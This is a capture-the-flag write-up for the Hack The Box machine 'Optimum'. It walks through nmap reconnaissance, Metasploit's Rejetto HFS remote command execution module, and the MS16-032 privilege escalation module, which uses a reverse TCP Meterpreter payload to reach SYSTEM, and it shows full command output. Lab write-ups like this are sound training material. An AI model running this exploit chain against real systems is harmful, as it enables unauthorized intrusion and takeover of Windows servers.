## ------------>> Optimum <<---------------

// Start with nmap scan 

    Nmap scan report for 10.10.10.8
    Host is up (0.19s latency).
    Not shown: 65534 filtered ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    HttpFileServer httpd 2.3
    |_http-server-header: HFS 2.3
    |_http-title: HFS /
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

// Only port 80 open (web) and the service running its HFS(Http File System)

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Optimum/1.png)

// lets search in MetaSploit for some exploits

    msf6 > search hfs

    Matching Modules
    ================

       #  Name                                        Disclosure Date  Rank       Check  Description
       -  ----                                        ---------------  ----       -----  -----------
       0  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


// We found a module called rejetto_hfs_exec

    msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
    RHOSTS => 10.10.10.8
    msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.17.8
    LHOST => 10.10.16.197
    msf6 exploit(windows/http/rejetto_hfs_exec) > set LPORT
    LPORT => 4444
    msf6 exploit(windows/http/rejetto_hfs_exec) > set LPORT 1444

    msf6 exploit(windows/http/rejetto_hfs_exec) > exploit -j

    [*] Meterpreter session 2 opened (10.10.17.8:1444 -> 10.10.10.8:49167) at 2021-06-25 05:15:21 -0400
    [*] Server stopped.
    [!] This exploit may require manual cleanup of '%TEMP%\wmPLpUeeb.vbs' on the target

    meterpreter > getuid
    Server username: OPTIMUM\kostas

// We got shell !! and user flag !

    meterpreter > cat user.txt
    d0c39409d7...................
    
### ------Privilleges Escalation------

// First we will get the systeminfo

	C:\Users\kostas\Desktop>systeminfo
	systeminfo

	Host Name:                 OPTIMUM
	OS Name:                   Microsoft Windows Server 2012 R2 Standard
	OS Version:                6.3.9600 N/A Build 9600
	OS Manufacturer:           Microsoft Corporation
	OS Configuration:          Standalone Server
	OS Build Type:             Multiprocessor Free
	Registered Owner:          Windows User
	Registered Organization:   
	Product ID:                00252-70000-00000-AA535
	Original Install Date:     18/3/2017, 1:51:36 ��
	System Boot Time:          12/8/2021, 1:04:40 ��
	System Manufacturer:       VMware, Inc.
	System Model:              VMware Virtual Platform
	System Type:               x64-based PC
	Processor(s):              1 Processor(s) Installed.
				   [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
	BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
	Windows Directory:         C:\Windows
	System Directory:          C:\Windows\system32
	Boot Device:               \Device\HarddiskVolume1
	System Locale:             el;Greek
	Input Locale:              en-us;English (United States)
	Time Zone:                 (UTC+02:00) Athens, Bucharest
	Total Physical Memory:     4.095 MB
	Available Physical Memory: 3.500 MB
	Virtual Memory: Max Size:  5.503 MB
	Virtual Memory: Available: 4.945 MB
	Virtual Memory: In Use:    558 MB
	Page File Location(s):     C:\pagefile.sys
	Domain:                    HTB
	Logon Server:              \\OPTIMUM
	Hotfix(s):                 31 Hotfix(s) Installed.
				   [01]: KB2959936
				   [02]: KB2896496
				   [03]: KB2919355
				   [04]: KB2920189
				   [05]: KB2928120
				   [06]: KB2931358
				   [07]: KB2931366
				   [08]: KB2933826
				   [09]: KB2938772
				   [10]: KB2949621
				   [11]: KB2954879
				   [12]: KB2958262
				   [13]: KB2958263
				   [14]: KB2961072
				   [15]: KB2965500
				   [16]: KB2966407
				   [17]: KB2967917
				   [18]: KB2971203
				   [19]: KB2971850
				   [20]: KB2973351
				   [21]: KB2973448
				   [22]: KB2975061
				   [23]: KB2976627
				   [24]: KB2977629
				   [25]: KB2981580
				   [26]: KB2987107
				   [27]: KB2989647
				   [28]: KB2998527
				   [29]: KB3000850
				   [30]: KB3003057
				   [31]: KB3014442
	Network Card(s):           1 NIC(s) Installed.
				   [01]: Intel(R) 82574L Gigabit Network Connection
					 Connection Name: Ethernet0
					 DHCP Enabled:    No
					 IP address(es)
					 [01]: 10.10.10.8
	Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

// Copy the the output to file 'systeminfo.txt' at your host.

// Second stage its to download [Windows-Exploit-Suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)(tool compares a targets patch levels against the Microsoft vulnerability database by AonCyberLabs)

	$ ./windows-exploit-suggester.py --update
// now we can run the script
	
	$ python windows-exploit-suggester.py -i systeminfo.txt -d 2021-07-08-mssb.xls
------

	[*] initiating winsploit version 3.3...
	[*] database file detected as xls or xlsx based on extension
	[*] attempting to read from the systeminfo input file
	[+] systeminfo input file read successfully (utf-8)
	[*] querying database file for potential vulnerabilities
	[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
	[*] there are now 246 remaining vulns
	[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
	[+] windows version identified as 'Windows 2012 R2 64-bit'
	[*] 
	[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
	[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
	[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
	[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
	[*] 
	[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
	[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
	[*] 
	[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
	[*]   https://github.com/foxglovesec/RottenPotato
	[*]   https://github.com/Kevin-Robertson/Tater
	[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
	[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
	[*] 
	[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
	[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
	[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
	[*] 
	[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
	[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
	[*] 
	[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
	[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
	[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
	[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
	[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
	[*] 
	[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
	[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
	[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
	[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
	[*] 
	[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
	[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
	[*] 
	[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
	[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
	[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
	[*] 
	[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
	[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
	[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
	[*] 
	[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
	[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
	[*] 
	[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
	[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
	[*] 
	[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
	[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
	[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
	[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
	[*] 
	[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
	[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
	[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
	[*] 
	[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
	[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
	[*] 
	[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
	[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
	[*] 
	[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
	[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
	[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
	[*] 
	[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
	[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
	[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
	[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
	[*] 
	[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
	[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
	[*] 
	[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
	[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
	[*] 
	[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
	[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
	[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
	[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
	[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
	[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
	[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
	[*] 
	[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
	[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
	[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
	[*] 
	[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
	[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
	[*] 
	[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
	[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
	[*] done

// Since we want to Elevate privilleges, ms-16-032 , seems worth to check 

	[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important

// we can try to search in MetaSploit that Vulnerability

// First send our corrent session to background

	meterpreter > background 
	[*] Backgrounding session 1...

// Then we will search ms16-03

	msf6 post(multi/recon/local_exploit_suggester) > search ms16-032

	Matching Modules
	================

	   #  Name                                                           Disclosure Date  Rank    Check  Description
	   -  ----                                                           ---------------  ----    -----  -----------
	   0  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  Yes    MS16-032 Secondary Logon Handle Privilege Escalation


	Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms16_032_secondary_logon_handle_privesc

// found one match, lets try this

	msf6 post(multi/recon/local_exploit_suggester) > use 0
	[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
// and set the currect options (Session and Target Archicture(our case: x64))

	msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
	session => 1
	msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set target 1
	target => 1
// last check for all options

	msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options 

	Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

	   Name     Current Setting  Required  Description
	   ----     ---------------  --------  -----------
	   SESSION  1                yes       The session to run this module on.


	Payload options (windows/meterpreter/reverse_tcp):

	   Name      Current Setting  Required  Description
	   ----      ---------------  --------  -----------
	   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
	   LHOST     10.10.17.8       yes       The listen address (an interface may be specified)
	   LPORT     1446             yes       The listen port


	Exploit target:

	   Id  Name
	   --  ----
	   1   Windows x64
// and we can execute

	msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit 

	[*] Started reverse TCP handler on 10.10.17.8:1446 
	[+] Compressed size: 1100
	[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
	[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\OuriFMbXVwg.ps1...
	[*] Compressing script contents...
	[+] Compressed size: 3596
	[*] Executing exploit script...
		 __ __ ___ ___   ___     ___ ___ ___ 
		|  V  |  _|_  | |  _|___|   |_  |_  |
		|     |_  |_| |_| . |___| | |_  |  _|
		|_|_|_|___|_____|___|   |___|___|___|

			       [by b33f -> @FuzzySec]

	[?] Operating system core count: 2
	[>] Duplicating CreateProcessWithLogonW handle
	[?] Done, using thread handle: 1364

	[*] Sniffing out privileged impersonation token..

	[?] Thread belongs to: svchost
	[+] Thread suspended
	[>] Wiping current impersonation token
	[>] Building SYSTEM impersonation token
	[?] Success, open SYSTEM token handle: 1376
	[+] Resuming thread..

	[*] Sniffing out SYSTEM shell..

	[>] Duplicating SYSTEM token
	[>] Starting token race
	[>] Starting process race
	[!] Holy handle leak Batman, we have a SYSTEM shell!!

	AgeWAvj08Aj4pQIL73bpsDqUe7CqCP5m
	[+] Executed on target machine.
	[*] Sending stage (175174 bytes) to 10.10.10.8
	[*] Meterpreter session 2 opened (10.10.17.8:1446 -> 10.10.10.8:49173) at 2021-08-05 13:59:06 +0000
	[+] Deleted C:\Users\kostas\AppData\Local\Temp\OuriFMbXVwg.ps1

	meterpreter > getuid
	Server username: NT AUTHORITY\SYSTEM

// It worked !, we have root flag !

	meterpreter > cat root.txt
	51ed1b36.....................
